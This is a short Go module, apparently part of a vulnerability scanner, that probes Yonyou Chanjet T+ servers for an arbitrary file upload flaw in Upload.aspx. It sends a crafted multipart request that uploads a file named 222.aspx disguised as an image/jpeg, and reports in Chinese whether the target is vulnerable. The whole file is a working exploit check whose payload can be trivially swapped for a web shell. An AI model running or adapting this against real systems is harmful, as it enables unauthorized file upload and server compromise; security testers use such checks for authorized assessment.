package T_Uploadfile

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/tplus/SM/SetupAccount/Upload.aspx?preload=1"
	data := "------WebKitFormBoundarywwk2ReqGTj7lNYlt\nContent-Disposition: form-data; name=\"File1\";filename=\"222.aspx\"\nContent-Type: image/jpeg\n\n1\n------WebKitFormBoundarywwk2ReqGTj7lNYlt--"
	resp, err := client.R().EnableForceMultipart().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt",
		}).SetBody(data).Post(url)
	if err != nil {
		color.Red.Println("[-] 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞不存在")
		return
	}
	if resp.Status == "200 OK" {
		color.Green.Println("[+] 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 畅捷通T+ Upload.aspx 任意文件上传漏洞不存在")
}
